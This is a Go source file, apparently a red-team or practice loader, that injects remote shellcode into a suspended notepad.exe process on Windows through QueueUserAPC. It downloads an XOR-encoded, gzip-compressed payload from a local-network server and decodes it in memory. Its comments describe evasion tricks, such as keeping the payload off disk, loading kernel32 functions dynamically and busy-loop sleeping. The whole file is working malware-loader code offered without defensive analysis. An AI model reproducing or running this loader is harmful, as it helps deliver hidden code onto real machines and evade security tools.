package main

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net/http"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {
	//sleep for 10 seconds
	fmt.Println("Going to sleep...")
	sleepNow()

	fmt.Println("Finally...waking up now!")

	//Step 1: Create notepad.exe in suspended state
	fmt.Println("[+] Creating notepad.exe in suspended state")
	pi := createSuspendedProcess()
	fmt.Printf("[+] Created Suspended process with PID: %d\n", pi.ProcessId)
	fmt.Printf("[+] Main thread ID: %d\n", pi.ThreadId)

	//Download shellcode from remote server
	//Common technique to avoid malicious payload on disk
	encryptedBase64, err := wget("http://192.168.1.108:9000/compressed_payload.txt")
	if err != nil {
		log.Fatalf("[-] Unable to connect to the host: %v", err)
	}

	fmt.Printf("[+] Downloaded compressed payload: %d characters\n", len(encryptedBase64))
	//Convert downloaded bytes to string

	//Time to decrypt the payload
	sc, err := decryptCompressedShellcode(string(encryptedBase64), 170)
	if err != nil {
		log.Fatalf("[!] Failed to decrypt shellcode: %v", err)
	}

	fmt.Printf("[+] Successfully decrypted shellcode (%d bytes)\n", len(sc))

	fmt.Println("Going to Sleep Again...")
	sleepNow()

	//Step 2: Allocate Memory in the suspended process
	//Load kernel32.dll dynamically to us windows API functions
	modkernel32 := syscall.NewLazyDLL("kernel32.dll")
	procVirtualAllocEx := modkernel32.NewProc("VirtualAllocEx")

	//VirtualAllocEx: Allocate memory in the target process
	//Parameters: Process handle, preferred address, size, allocation type, protection
	addr, _, lastErr := procVirtualAllocEx.Call(
		uintptr(pi.Process), //Handle to target process
		uintptr(0),          //Let system decide where to allocate
		uintptr(len(sc)),    //size of shellcode
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_READWRITE)) //Initial memory protection is not executable

	if addr == 0 {
		log.Fatalf("[-] VirtualAlloc Failed: %v\n", lastErr)
	}
	fmt.Printf("[+] Allocated memory address: 0x%x\n", addr)

	//Step 3: Write shellcode into allocated memory
	var numberOfBytesWritten uintptr
	err = windows.WriteProcessMemory(pi.Process, addr, &sc[0], uintptr(len(sc)), &numberOfBytesWritten)
	if err != nil {
		log.Fatalf("[-] Unable to write shellcode: %v", err)
	}
	fmt.Printf("[+] Wrote %d/%d bytes to destination address\n", numberOfBytesWritten, len(sc))

	//Stage 4: Change memory protection to executable
	//From PAGE_READWRITE to PAGE_EXECUTE_READ to execute payload
	var oldProtect uint32
	err = windows.VirtualProtectEx(pi.Process, addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)

	if err != nil {
		log.Fatalf("[-] VirtualProtect Failed: %v", err)
	}

	//Step 5: QueueUserAPC (APC Injection)
	fmt.Println("[+] Using APC Injection")
	hijackThreadAndExecute(pi, addr)

	//Step 6: Resume thread
	//APC queue runs our shellcode which has hijacked a thread on the suspended process
	fmt.Println("[+] Resuming the Main thread...")
	resumeThread(pi.Thread)

	//Step 7: Cleanup handles
	windows.CloseHandle(pi.Process)
	windows.CloseHandle(pi.Thread)

	fmt.Println("[+] Injection complete! Shellcode should be executing.")
}

func sleepNow() {
	var t0, t1 time.Time
	fmt.Println("Sleeping for 10 seconds")
	t0 = time.Now()

	for {
		t1 = time.Now()
		diff := t1.Sub(t0)
		if diff.Seconds() > 10 {
			break
		}
	}
	fmt.Println("Done sleeping")
}

// Decryption function for compressed base64 payload
func decryptCompressedShellcode(encryptedBase64 string, xorKey byte) ([]byte, error) {
	fmt.Printf("[*] Decoding compressed payload (%d chars)...\n", len(encryptedBase64))

	// 1. Decode base64
	encryptedData, err := base64.StdEncoding.DecodeString(encryptedBase64)
	if err != nil {
		return nil, fmt.Errorf("base64 decode failed: %v", err)
	}
	fmt.Printf("[*] Base64 decoded: %d bytes\n", len(encryptedData))

	// 2. XOR decrypt
	compressedData := make([]byte, len(encryptedData))
	for i := range encryptedData {
		compressedData[i] = encryptedData[i] ^ xorKey
	}
	fmt.Printf("[*] XOR decrypted with key 0x%02x\n", xorKey)

	// 3. Decompress gzip
	gzReader, err := gzip.NewReader(bytes.NewReader(compressedData))
	if err != nil {
		return nil, fmt.Errorf("gzip decompress failed: %v", err)
	}
	defer gzReader.Close()

	shellcode, err := io.ReadAll(gzReader)
	if err != nil {
		return nil, fmt.Errorf("read decompressed data failed: %v", err)
	}

	fmt.Printf("[+] Decompressed shellcode: %d bytes\n", len(shellcode))
	return shellcode, nil
}

// HTTP download function - fetches shellcode from remote server
// This allows updating payload without modifying the executable
func wget(url string) ([]byte, error) {
	client := &http.Client{
		Timeout: 30 * time.Second,
	}

	resp, err := client.Get(url)
	if err != nil {
		return []byte{}, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return []byte{}, fmt.Errorf("HTTP status: %s", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return []byte{}, err
	}
	return body, nil
}

// Function to create a suspended process
// Returns ProcessInformation containing both process and thread handles
func createSuspendedProcess() windows.ProcessInformation {
	// Dynamically load kernel32.dll to avoid static imports
	modkernel32 := syscall.NewLazyDLL("kernel32.dll")
	procCreateProcess := modkernel32.NewProc("CreateProcessW")

	var si windows.StartupInfo
	var pi windows.ProcessInformation

	// Initialize StartupInfo structure
	si.Cb = uint32(unsafe.Sizeof(si))

	// Convert strings to UTF-16 pointers for Windows API
	appName, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32\\notepad.exe")
	commandLine, _ := syscall.UTF16PtrFromString("") // Empty command line

	// CreateProcessW with CREATE_SUSPENDED flag (0x00000004)
	// Process is created but main thread is suspended, not running yet
	ret, _, err := procCreateProcess.Call(
		uintptr(unsafe.Pointer(appName)),     // Application name
		uintptr(unsafe.Pointer(commandLine)), // Command line
		uintptr(0),                           // Process security attributes (NULL = default)
		uintptr(0),                           // Thread security attributes (NULL = default)
		uintptr(0),                           // Inherit handles (FALSE = don't inherit)
		uintptr(0x00000004),                  // Creation flags: CREATE_SUSPENDED
		uintptr(0),                           // Environment (NULL = use parent's)
		uintptr(0),                           // Current directory (NULL = use parent's)
		uintptr(unsafe.Pointer(&si)),         // Startup info
		uintptr(unsafe.Pointer(&pi)))         // Process info (output)

	if ret == 0 { // Return value of 0 indicates failure
		log.Fatalf("[-] Failed to create suspended process: %v", err)
	}

	return pi // Return process and thread information
}

// APC Injection
func hijackThreadAndExecute(pi windows.ProcessInformation, shellcodeAddr uintptr) {
	modkernel32 := syscall.NewLazyDLL("kernel32.dll")
	procQueueUserAPC := modkernel32.NewProc("QueueUserAPC")

	//QueueUserAPC adds an APC to the thread's APC queue
	//Executes when we resume thread
	ret, _, lastErr := procQueueUserAPC.Call(
		shellcodeAddr,      //pointer to APC function --> shellcode address
		uintptr(pi.Thread), //hThread: Handle to target thread
		0)                  //unused

	if ret == 0 {
		log.Fatalf("[-] QueueUserAPC failed: %v", lastErr)
	}

	fmt.Printf("[+] APC queued successfully for thread: 0x%x\n", pi.Thread)

	//Shellcode will run when process is resumed
}

// Function to resume suspended thread
// Triggers thread to check its APC queue and execute our shellcode
func resumeThread(threadHandle windows.Handle) {
	modkernel32 := syscall.NewLazyDLL("kernel32.dll")
	procResumeThread := modkernel32.NewProc("ResumeThread")

	//ResumeThread decreases thread's suspend count by 1
	ret, _, err := procResumeThread.Call(uintptr(threadHandle))
	if ret == uintptr(0xFFFFFFFF) {
		log.Fatalf("[-] Failed to resume thread: %v", err)
	}

	fmt.Printf("[+] Thread resumed successfully (Previous suspend count: %d)\n", ret)
}